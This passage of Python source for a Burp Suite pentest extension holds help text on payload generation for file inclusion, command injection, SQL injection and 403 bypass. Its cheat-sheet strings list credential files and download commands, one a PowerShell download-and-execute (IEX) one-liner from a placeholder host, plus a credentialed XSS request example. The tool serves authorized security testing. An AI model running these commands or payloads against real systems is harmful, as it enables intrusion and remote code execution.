        <li><strong>SQL Injection:</strong> It assists to uncover SQL Injection vulnerabilities, including Stacked Queries, Boolean-Based, Union-Based, and Time-Based.</li>
        </ul>
        </li>
        <li><strong>Auth Matrix</strong>: By constructing a comprehensive access matrix, the tool reveals potential access violations and privilege escalation paths. This feature enhances security posture by addressing authentication and authorization issues. <ul>
        <li>You can use the web <strong>&#39;Spider&#39;</strong> feature to generate a sitemap/URL list, and it will crawl visible links from the user&#39;s session automatically.</li>
        </ul>
        </li>
        <li><strong>403 Bypass</strong>: It aims to tackle common access restrictions, such as HTTP 403 Forbidden responses. It utilizes techniques like URL manipulation and request header modification to bypass implemented limitations.</li>
        <li><strong>Copy as JavaScript</strong>: It converts Http requests to JavaScript code for further XSS exploitation and more.<br/><br/></li>
        </ul>
        <p>Here is a small tutorial how to use.</p>
        <h2>Installation</h2>
        <p>You should download &#39;Jython&#39; file and set your environment first:</p>
        <ul>
        <li>Burp Menu &gt; Extender &gt; Options &gt; Python Environment &gt; Locate Jython standalone jar file.</li>
        </ul>
        <p>You can install Agartha through official store: </p>
        <ul>
        <li>Burp Menu &gt; Extender &gt; BApp Store &gt; Agartha</li>
        </ul>
        <p>Or for manual installation:</p>
        <ul>
        <li>Burp Menu &gt; Extender &gt; Extensions &gt; Add &gt; Extension Type: Python &gt; Extension file(.py): Select &#39;Agartha.py&#39; file</li>
        </ul>
        <p>After all, you will see &#39;Agartha&#39; tab in the main window and it will be also registered the right click, under: </p>
        <ul>
        <li>&#39;Extensions &gt; Agartha - LFI, RCE, SQLi, Auth, HTTP to JS&#39;, with three sub-menus:<ul>
        <li><strong>&#39;Auth Matrix&#39;</strong></li>
        <li><strong>&#39;403 Bypass&#39;</strong></li>
        <li><strong>&#39;Copy as JavaScript&#39;</strong><br/><br/></li>
        </ul>
        </li>
        </ul>
        <h2>Local File Inclusion / Path Traversal</h2>
        <p>It supports both Unix and Windows file syntaxes, enabling dynamic wordlist generation for any desired path. Additionally, it can attempt to bypass Web Application Firewall (WAF) implementations, with various encodings and other techniques.</p>
        <ul>
        <li><strong>&#39;Depth&#39;</strong> specifies the extent of directory traversal for wordlist generation. You can create wordlists that reach up to or equal to this specified level. The default value is 5.</li>
        <li><strong>&#39;Waf Bypass&#39;</strong> inquires whether you want to enable all bypass features, such as the use of null bytes, various encoding techniques, and other methods to circumvent web application firewalls.</li>
        </ul>
        <p><img width=\"1000\" alt=\"Directory Traversal/Local File Inclusion wordlist\" src=\"https://github.com/user-attachments/assets/f60c5ec7-9bd7-40d3-aa8c-ec3b0212fdbb\"><br/><br/></p>
        <h2>Remote Code Execution / Command Injection</h2>
        <p>It generates dynamic wordlists for command execution based on the supplied command. It combines various separators and terminators for both Unix and Windows environments.</p>
        <ul>
        <li><strong>&#39;URL Encoding&#39;</strong> encodes the output.</li>
        </ul>
        <p><img width=\"1000\" alt=\"Remote Code Execution wordlist\" src=\"https://github.com/user-attachments/assets/0a074ff9-5eb1-4839-beba-5fe26792de1b\"><br/><br/></p>
        <h2>SQL Injection</h2>
        <p>It generates payloads for various types of SQL injection attacks, including Stacked Queries, Boolean-Based, Union-Based, and Time-Based. It doesn't require any user inputs; you simply select the desired SQL attack types and databases, and it generates a wordlist with different combinations.</p>
        <ul>
        <li><strong>&#39;URL Encoding&#39;</strong> encodes the output.</li>
        <li><strong>&#39;Waf Bypass&#39;</strong> inquires whether you want to enable all bypass features, such as the use of null bytes, various encoding techniques, and other methods to circumvent web application firewalls.</li>
        <li><strong>&#39;Union-Based&#39;</strong> requires the specified depth for payload generation. You can create wordlists that reach up to the given value. The default value is 5.</li>
        <li>The remaining aspects pertain to database types and various attack vectors.</li>
        </ul>
        <p><img width=\"1000\" alt=\"SQL Injection wordlist\" src=\"https://github.com/user-attachments/assets/0393253b-195e-410b-bb5d-a687761fb743\"><br/><br/></p>
        <h2>Authorization Matrix / User Access Table</h2>
        <p>This part focuses on analyzing user session and URL relationships to identify access violations. The tool systematically visits all URLs associated with pre-defined user sessions and populates a table with HTTP responses. Essentially, it creates an access matrix, which aids in identifying authentication and authorization issues. Ultimately, this process reveals which users can access specific page contents.</p>
        <ul>
        <li>You can right-click on any request and navigate to &#39;Extensions &gt; Agartha &gt; Auth Matrix&#39; to define <strong>user sessions</strong>.</li>
        <li>Next, you need to provide the <strong>URL addresses</strong> that the user (HTTP header/session owner) can access. You can utilize the web &#39;Spider&#39; feature for automated crawling or supply a manually curated list of URLs.</li>
        <li>Afterward, you can use the <strong>&#39;Add User&#39;</strong> button to include the user sessions.</li>
        <li>Now, it&#39;s ready for execution. Simply click the <strong>&#39;Run&#39;</strong> button, and the table will be populated accordingly.</li>
        </ul>
        <img width=\"1000\" alt=\"Authorization Matrix\" src=\"https://github.com/user-attachments/assets/62255976-d633-4a6e-b0a5-716d060a3451\">
        
        
        <p>A little bit more details:</p>
        <ol>
        <li>This is the field where you enter the username for the session you provide. You can add up to four different users, with each user being assigned a unique color to enhance readability.<ul>
        <li>The &#39;Add User&#39; button allows you to include user sessions in the matrix.</li>
        <li>You can change the HTTP request method to &#39;GET&#39;, &#39;POST&#39;, or &#39;Dynamic&#39;, the latter of which is based on proxy history.</li>
        <li>The &#39;Reset&#39; button clears all contents.</li>
        <li>The &#39;Run&#39; button executes the task, displaying the results in the user access matrix.</li>
        <li>The &#39;Warnings&#39; section highlights potential issues using different colors for easy identification.</li>
        <li>The &#39;Spider (SiteMap)&#39; button automatically generates a URL list based on the user&#39;s header/session. The visible URLs will be populated in the next textbox, where you can still make modifications as needed.</li>
        <li>&#39;Crawl Depth&#39; defines the maximum number of sub-links that the &#39;Spider&#39; should crawl to detect links.</li>
        </ul>
        </li>
        <li>The field is for specifying request headers, and all URLs will be accessed using the session defined here.</li>
        <li>Specify the URL addresses that users can visit. You can create this list manually or utilize the <strong>&#39;Spider&#39;</strong> crawler feature. Make sure to provide a visitable URL list for each user.</li>
        <li>All provided URLs will be listed here and attempted to access using the corresponding user sessions.</li>
        <li>The first column represents a scenario with no authentication attempt. All cookies, tokens, and potential session parameters will be removed from the HTTP calls.</li>
        <li>The remaining columns correspond to the users previously generated, each marked with a unique color to indicate the respective URL owners. </li>
        <li>The cell titles display the HTTP response &#39;codes:lengths&#39; for each user session, providing a clear overview of the response details for each access attempt.</li>
        <li>Just click on the cell you want to examine, and the HTTP details will be displayed at the bottom.</li>
        </ol>
        <p>Please note that potential session terminators (such as logoff, sign-out, etc.) and specific file types (such as CSS, images, JavaScript, etc.) will be filtered out from both the &#39;Spider&#39; and the user&#39;s URL list.</p>
        <img width=\"1000\" alt=\"User Access Table Details\" src=\"https://github.com/volkandindar/agartha/assets/50321735/e7ce918e-d40e-44c5-ada7-ee1c0cfa487b\">
        
        <p>After clicking &#39;RUN&#39;, the tool will populate the user and URL matrix with different colors. In addition to user-specific colors, you will see red, orange, and yellow cells indicating possible access issues.</p>
        <ul>
        <li><strong>Red</strong> highlights a critical access violation, indicated by the response returning &#39;HTTP 200&#39; with the same content length.</li>
        <li><strong>Orange</strong> signifies a moderate issue that needs attention, marked by the response returning &#39;HTTP 200&#39; but with a different content length.</li>
        <li><strong>Yellow</strong> indicates that the response returns an &#39;HTTP 302&#39; status, signifying a redirection.</li>
        </ul>
        <p>The task at hand involves a bulk process, and it is worth to mention which HTTP request methods will be used. The tool provides three different options for performing HTTP calls:</p>
        <ul>
        <li><strong>GET</strong>, All requests are sent using the GET method.</li>
        <li><strong>POST</strong>, All requests are sent using the POST method.</li>
        <li><strong>Dynamic</strong>, The request method is determined by the proxy history. If no information is available, the base header method will be used by default.<br/><br/></li>
        </ul>
        <h2>403 Bypass</h2>
        <p>HTTP 403 Forbidden status code indicates that the server understands the request but refuses to authorize it. Essentially, it means, 'I recognize who you are, but you lack permission to access this resource.' This status often points to issues like 'insufficient permissions', 'authentication required', 'IP restrictions', etc.</p>
        <p>The tool addresses the common access forbidden error by employing various techniques, such as URL manipulation and request header modification. These strategies aim to bypass access restrictions and retrieve the desired content.</p>
        <p>It is worth to mention two different usage cases:</p>
        <ol>
        <li>In scenarios related to <strong>Authentication Issues</strong>, it is essential to consider removing all session identifiers. After doing so, test whether any sources become publicly accessible. This approach helps identify unauthenticated accesses and ensures that sensitive information remains protected. </li>
        <li>For <strong>Privilege Escalation and Authorization</strong> testing, retain session identifiers but limit their use to specific user roles. For instance, you can utilize a regular user's session while substituting an administrative URL. This focused approach allows for more precise and efficient testing, ensuring that privileged sources are not accessible without the appropriate roles.</li>
        </ol>
        <p>There are 2 ways you can send HTTP requests to the tool.</p>
        <ol>
        <li>You can load requests from proxy history by clicking the 'Load Requests' button. Doing so will automatically remove all session identifiers, making it suitable for attack <strong>Case 1</strong>. Any potential session terminators (such as logoff, sign-out, etc.) and specific file types (such as CSS, images, JavaScript, etc.) will be also filtered out. Please note that this will be a bulk process and may take longer as it involves revisiting each HTTP request from the history. However, this comprehensive verification of all endpoints is essential for ensuring the security of the authentication mechanisms</li>
        <li>You can send individual requests by right-clicking. Session identifiers will be retained/untouched, making this approach suitable for attack <strong>Case 2</strong>. This controlled approach allows you to assess whether privileged sources are accessible without proper roles. It will be more specific and faster, as users will select which URLs to test rather than copying everything from history.</li>
        </ol>
        <img width=\"1000\" alt=\"Sending individual requests\" src=\"https://github.com/volkandindar/agartha/assets/50321735/54b567a0-6b69-43f4-b727-f01709f4cc79\">
        
        <p>The page we aim to access belongs to a privileged user group, and we retain our session identifiers to verify if Privilege Escalation is feasible.
        <br/><br/>
        Simply clicking the &#39;RUN&#39; button will execute the task.</p>
        <p>The figure below illustrates that a URL may have an access issue, with the 'Red' color indicating a warning.</p>
        <img width=\"1000\" alt=\"Attempt details\" src=\"https://github.com/volkandindar/agartha/assets/50321735/b7c81258-aa11-42dc-87c6-c25b1047056c\">
        
        <ol>
        <li>Load requests from the proxy history by selecting the target hostname and clicking the 'Load Requests' button.</li>
        <li>URL and Header details</li>
        <li>Request attempts and results</li>
        <li>HTTP requests and responses</li>
        </ol>
        <p>Please note that the number of attempts is contingent upon the specific target URL.
        <br/><br/></p>
        <h2>Copy as JavaScript</h2>
        <p>The feature enables the conversion of HTTP requests into JavaScript code, which can be particularly useful for going beyond XSS vulnerabilities and bypassing header restrictions.</p>
        <p>To use this feature, simply right-click on any HTTP request and select &#39;Extensions &gt; Agartha &gt; Copy as JavaScript&#39;.</p>
        <img width=\"1000\" alt=\"Copy as JavaScript\" src=\"https://github.com/volkandindar/agartha/assets/50321735/c0149adb-d0ab-4aa3-98a1-34b86bd68d3f\">
        
        <p>It will automatically save to your clipboard, including some additional remarks for your reference. For example:</p>
        <pre><code>
        Http request with minimum header paramaters in JavaScript:
            &lt;script&gt;
                var xhr=new XMLHttpRequest();
                xhr.open(&#39;GET&#39;,&#39;http://dvwa.local/vulnerabilities/xss_r/?name=XSS&#39;);
                xhr.withCredentials=true;
                xhr.send();
            &lt;/script&gt;
        
        Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:
            &lt;script&gt;
                var xhr=new XMLHttpRequest();
                xhr.open(&#39;GET&#39;,&#39;http://dvwa.local/vulnerabilities/xss_r/?name=XSS&#39;);
                xhr.withCredentials=true;
                xhr.setRequestHeader(&#39;Host&#39;,&#39; dvwa.local&#39;);
                xhr.setRequestHeader(&#39;User-Agent&#39;,&#39; Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0&#39;);
                xhr.setRequestHeader(&#39;Accept&#39;,&#39; text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;);
                xhr.setRequestHeader(&#39;Accept-Language&#39;,&#39; en-US,en;q=0.5&#39;);
                xhr.setRequestHeader(&#39;Accept-Encoding&#39;,&#39; gzip, deflate, br&#39;);
                xhr.setRequestHeader(&#39;DNT&#39;,&#39; 1&#39;);
                xhr.setRequestHeader(&#39;Sec-GPC&#39;,&#39; 1&#39;);
                xhr.setRequestHeader(&#39;Connection&#39;,&#39; keep-alive&#39;);
                xhr.setRequestHeader(&#39;Referer&#39;,&#39; http://dvwa.local/vulnerabilities/xss_r/&#39;);
                xhr.setRequestHeader(&#39;Upgrade-Insecure-Requests&#39;,&#39; 1&#39;);
                xhr.setRequestHeader(&#39;Priority&#39;,&#39; u=1&#39;);
                xhr.send();
            &lt;/script&gt;
        
        For redirection, please also add this code before &#39;&lt;/script&gt;&#39; tag:
            xhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader(&#39;Location&#39;);return ajax.call(this,location);}};
        </code></pre>
        <p>Please note that the JavaScript code will execute within the original user session, with many header fields automatically populated by the browser. However, in some cases, the server may require specific mandatory header fields. For example, certain requests might fail if the &#39;Content-Type&#39; is incorrect. Therefore, you may need to adjust the code to ensure compatibility with the server&#39;s requirements.</p>
        """
        htmlString +="</td></tr></table></body></html>"
        self.editorPaneInfo.setText(htmlString);
        self.editorScrollPaneInfo = JScrollPane(self.editorPaneInfo);
        self.editorScrollPaneInfo.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
        self._tabHelpJPanel.add(self.editorScrollPaneInfo, BorderLayout.CENTER);

    def _tabDictUI(self):
        # top panel
        self._txtDefaultLFI = "Example: '/etc/passwd', 'C:\\boot.ini'"
        self._txtDefaultCommandInj = "Examples: $'sleep 120', >'timeout 120' - for 2 minutes"
        self._txtDefaultSQLi = "No input is needed to supply!"
        self._txtCheatSheetLFI = ""
        self._txtCheatSheetLFI += "Common files for Linux\t\t\tCommon files for Windows\n"
        self._txtCheatSheetLFI += "\t/etc/passwd\t\t\tC:\\boot.ini\n"
        self._txtCheatSheetLFI += "\t/etc/profile\t\t\t\tC:\\windows\\win.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/environ\t\t\tC:\\windows\\system.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/status\t\t\tC:\\windows\\system32\\notepad.exe\n"
        self._txtCheatSheetLFI += "\t/etc/hosts\t\t\t\tC:\\windows\\system32\\drivers\\etc\\hosts\n"
        self._txtCheatSheetLFI += "\t/etc/shadow\t\t\tC:\\windows\\system32\\license.rtf\n"
        self._txtCheatSheetLFI += "\t/etc/group\t\t\t\tC:\\users\\public\\desktop\\desktop.ini\n"
        self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\tC:\\windows\\system32\\eula.txt\n"
        
        self._txtCheatSheetCommandInj = ""
        self._txtCheatSheetCommandInj += "Common commands for Unix\t\t\tCommon commands for Windows\n"
        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\ttype file.txt\n"
        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\tsysteminfo\n"
        self._txtCheatSheetCommandInj += "\tid\t\t\t\t\twhoami /priv\n"
        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"
        self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
        _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
        _lblDepth.setToolTipText("Generate payloads only for a specific depth.")
        _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
        _btnGenerateDict.setToolTipText("Click to generate payloads.")
        self._lblStatusLabel = JLabel()
        self._lblStatusLabel.setText("Please provide a path for payload generation!")
        self._txtTargetPath = JTextField(self._txtDefaultLFI, 30)
        self._rbDictLFI = JRadioButton('LFI / PT', True, itemStateChanged=self.funcRBSelection);
        self._rbDictLFI.setToolTipText("Payload generation for Local File Inclusion, Path Traversal.")
        self._rbDictCommandInj = JRadioButton('Command Inj / RCE', itemStateChanged=self.funcRBSelection)
        self._rbDictCommandInj.setToolTipText("Payload generation for Command Injection, Remote Code Execution.")
        self._rbDictSQLi = JRadioButton('SQL Injection', itemStateChanged=self.funcRBSelection)
        self._rbDictSQLi.setToolTipText("Payload generation for various type of SQL attacks.")
        _rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
        _rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
        _rbPanel = JPanel()
        _rbPanel.add(self._rbDictLFI)
        _rbPanel.add(self._rbDictCommandInj)
        _rbPanel.add(self._rbDictSQLi)
        _rbGroup = ButtonGroup()
        _rbGroup.add(self._rbDictLFI)
        _rbGroup.add(self._rbDictCommandInj)
        _rbGroup.add(self._rbDictSQLi)
        _rbGroup.add(_rbDictCheatSheet)
        _rbGroup.add(_rbDictFuzzer)
        self._cbDictWafBypass = JCheckBox('Waf Bypass', True)
        self._cbDictWafBypass.setToolTipText("It includes bypass techniques like null bytes, various type of encodings, different file extensions, etc.")
        self._cbDictEquality = JCheckBox(')', False)
        self._cbDictEquality.setToolTipText("Generate payloads only for a specific depth.")
        self._cbDictDepth = JComboBox(list(range(0, 20)))
        self._cbDictDepth.setSelectedIndex(5)
        self._cbDictDepth.setToolTipText("Folder depth limit. How much folder above should it go?")
        _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _cbDictDepthPanel.add(self._cbDictDepth)
        self._cbDictCommandInjEncoding = JCheckBox('URL Encoding', False)
        self._cbDictCommandInjEncoding.setToolTipText("Encodes the payload outcome.")
        self._cbDictCommandInjOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._cbDictCommandInjOpt.add(self._cbDictCommandInjEncoding)
        self._cbDictCommandInjOpt.setVisible(False)
        self._cbStackedSQL = JCheckBox('Stacked Queries', False)
        self._cbStackedSQL.setToolTipText("Stacked Query SQL Injection")
        self._cbTimeBased = JCheckBox('Time-Based', True)
        self._cbTimeBased.setToolTipText("Time-Based SQL Injection")
        self._cbUnionBased = JCheckBox('Union-Based', False, itemStateChanged=self._cbUnionBasedFunc)
        self._cbUnionBased.setToolTipText("Union-Based SQL Injection")
        self._cbUnionDepth = JComboBox(list(range(1, 20)))
        self._cbUnionDepth.setSelectedIndex(4)
        self._cbUnionDepth.setEnabled(False)
        self._cbUnionDepth.setToolTipText("Column numbers")
        self._cbBooleanBased = JCheckBox('Boolean-Based', True)
        self._cbBooleanBased.setToolTipText("Boolean-Based SQL Injection")
        self._cbMssqlBased = JCheckBox('MSSQL', True)
        self._cbMssqlBased.setToolTipText("Select database to include.")
        self._cbMysqlBased = JCheckBox('MYSQL', True)
        self._cbMysqlBased.setToolTipText("Select database to include.")
        self._cbPostgreBased = JCheckBox('POSTGRESQL', True)
        self._cbPostgreBased.setToolTipText("Select database to include.")
        self._cbOracleBased = JCheckBox('ORACLE', True)
        self._cbOracleBased.setToolTipText("Select database to include.")
        self._cbSqlWafBypass = JCheckBox('Waf Bypass', True)
        self._cbSqlWafBypass.setToolTipText("It includes protection bypass techniques, like null bytes, encoding, etc.")
        self._cbSqlEncoding = JCheckBox('URL Encoding', False)
        self._cbSqlEncoding.setToolTipText("Encodes the payload outcome.")
        _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_1.add(self._txtTargetPath, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_btnGenerateDict, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_LFI.add(_lblDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictEquality, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictWafBypass, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.setVisible(True)
        self._tabDictPanel_SQLType = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLType.add(self._cbMysqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbPostgreBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbMssqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbOracleBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLOptions = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLOptions.add(self._cbSqlEncoding, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLOptions.add(self._cbSqlWafBypass, BorderLayout.PAGE_START)        
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLi.add(self._cbStackedSQL, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbBooleanBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.setVisible(False)
        _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictCommandInjOpt, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLType, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLOptions, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)
        _tabDictPanel_1.setPreferredSize(Dimension(400, 90))
        _tabDictPanel_1.setMinimumSize(Dimension(400, 90))
        # top panel

        # center panel
        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _tabDictPanel_2.add(self._lblStatusLabel)
        # center panel
        
        # bottom panel 
        self._tabDictResultDisplay = JTextPane()
        self._tabDictResultDisplay.setContentType("text")
        self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
        self._tabDictResultDisplay.setEditable(False)
        _tabDictPanel_3 = JPanel(BorderLayout(10, 10))
        _tabDictPanel_3.setBorder(EmptyBorder(10, 0, 0, 0))
        _tabDictPanel_3.add(JScrollPane(self._tabDictResultDisplay), BorderLayout.CENTER)
        # bottom panel 

        self._tabDictPanel = JPanel()
        self._tabDictPanel.setLayout(BoxLayout(self._tabDictPanel, BoxLayout.Y_AXIS))
        self._tabDictPanel.add(_tabDictPanel_1)
        self._tabDictPanel.add(_tabDictPanel_2)
        self._tabDictPanel.add(_tabDictPanel_3)

    def tableMatrixReset(self, ev):
        self.tableMatrix = []        
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        self.userCount = 0
        self.userNames = []
        self.userNames.append("No Authentication")
        self.userNamesHttpReq = []
        self.userNamesHttpReq.append("")
        self.userNamesHttpUrls = [[]]
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = "Please add users to create an auth matrix!"
        self._lblAuthNotification.setForeground (Color.black)
        self._tbAuthNewUser.setForeground (Color.black)        
        self._txtHeaderDefault = "GET /example HTTP/1.1\nHost: localhost.com\nAccept-Encoding: gzip,deflate\nConnection: close\nCookie: SessionID=......"
        self._tbAuthHeader.setText(self._txtHeaderDefault)
        self._txtURLDefault = "http://localhost.com/example"
        self._tbAuthURL.setText(self._txtURLDefault)
        self._txtUserDefault = "User1"
        self._tbAuthNewUser.text = self._txtUserDefault.strip()
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._cbAuthGETPOST.setSelectedIndex(2)
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._btnAuthNewUserAdd.setEnabled(True)
        self.progressBar.setValue(0)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self._tabAuthPanel.setDividerLocation(0.25)
        self._tabAuthSplitpane.setDividerLocation(0.7)
        self._tabAuthSplitpaneHttp.setDividerLocation(0.5)

        return

    def siteMapGenerator(self, ev):
        t = Thread(target=self.siteMapGeneratorThread, args=[self])
        t.start()
        return

    def siteMapGeneratorThread(self, ev):
        for _url in self._tbAuthURL.getText().split('\n'):
            _url = _url.strip()
            if _url:
                _urlAdd = _url
                break
        if not _urlAdd:
            self._lblAuthNotification.text = "Please provide minimum one URL!"
            self._lblAuthNotification.setForeground (Color.red)
            return

        if not self.isURLValid(str(_urlAdd)) or _urlAdd == self._txtURLDefault:
            self._tbAuthURL.setForeground (Color.red)
            self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _urlAdd + "'"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthURL.setForeground (Color.black)
        
        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return        
        self._tbAuthHeader.setForeground (Color.black)        
        self._lblAuthNotification.setForeground (Color.black)

        self._lblAuthNotification.text = "The crawler has just started. Please bear in mind, links based on Javascript may not be detected properly."
        self._btnAuthNewUserAdd.setEnabled(False)
        self._tbAuthNewUser.setEnabled(False)
        self._cbSiteMapDepth.setEnabled(False)
        self._btnSiteMapGeneratorRun.setEnabled(False)


        _userURLs = []
        _userURLs.append(_urlAdd)
        folderDepth = 0
        crawledURLs = 0
        header = self._tbAuthHeader.getText()
        userLinks = _urlAdd + "\n"

        for _url in _userURLs:
            try:
                # changing new url path in the request header
                header =  header.replace(str(header.splitlines()[0]), header.splitlines()[0].split(" ", 2)[0] + " /" + _url.split('/',3)[3] + " " + header.splitlines()[0].split(" ", 2)[2])

                # header methods
                if "GET" in header[:3]:
                    # request was in GET method and will be in POST
                    if self._cbAuthGETPOST.getSelectedIndex() == 1:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                else:
                    # request was in POST alike method and will be in GET
                    if self._cbAuthGETPOST.getSelectedIndex() == 0:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                
                portNum = 80
                if urlparse.urlparse(_url).port:
                    portNum = urlparse.urlparse(_url).port
                else:
                    if urlparse.urlparse(_url).scheme == "https":
                        portNum = 443

                _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, portNum, urlparse.urlparse(_url).scheme), header)
                responseStatus = str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode())
                if _urlAdd == _url:
                    if not responseStatus.startswith("2"):
                        self._lblAuthNotification.text = "The user's header is returning 'HTTP " + responseStatus + "'. Please provide a valid header and URL."
                        self._btnAuthNewUserAdd.setEnabled(True)
                        self._tbAuthNewUser.setEnabled(True)
                        self._cbSiteMapDepth.setEnabled(True)
                        self._btnSiteMapGeneratorRun.setEnabled(True)
                        return
                
                msgBody = self._helpers.bytesToString(_httpReqRes.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset():])

                if msgBody:
                    links = re.findall("(https?://[^\\s\'\"<]+)", msgBody, re.IGNORECASE)
                    for link in links:
                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]
                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(url_regex, link, re.IGNORECASE)) and "/." not in link and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"

                    links = re.findall("<a\\s+[^>]*?href=[\'|\"](.*?)[\'\"].*?>", msgBody, re.IGNORECASE)
                    for link in (links.pop(0) for _ in xrange(len(links))):
                        if not ".." in link:
                            link = link.replace("/.", "/")
                        if link == ".":
                            link = "/"
                        if "%3a" in link[0:10]:
                            link =  urllib.unquote(link)

                        if '"' in link or '%22' in link or '%3c' in link or '<' in link or 'script' in link:
                            # abnormal urls to be excluded
                            link = ""
                            continue
                        elif link.startswith('/'):
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + link
                        elif link.startswith('#'):
                            if link == '#':
                                link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2]
                            else:
                                link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2] + link
                        elif link.startswith('..'):
                            path = urlparse.urlparse(_url)[2]
                            if not path.endswith('/'):
                                path = str(urlparse.urlparse(_url)[2]).rsplit('/', 1)[0] + "/"
                            _endswith =""
                            if link.endswith('/'):
                                _endswith ="/"
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + str(posixpath.normpath(path + link)) + _endswith
                        elif not link.startswith('http') and link:
                            if _url.endswith('/'):
                                link = _url.rsplit("/", 2)[0] + '/' + link
                            else:
                                link = _url.rsplit("/", 1)[0] + '/' + link
                        else: 
                            link = ""
                            continue

                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]

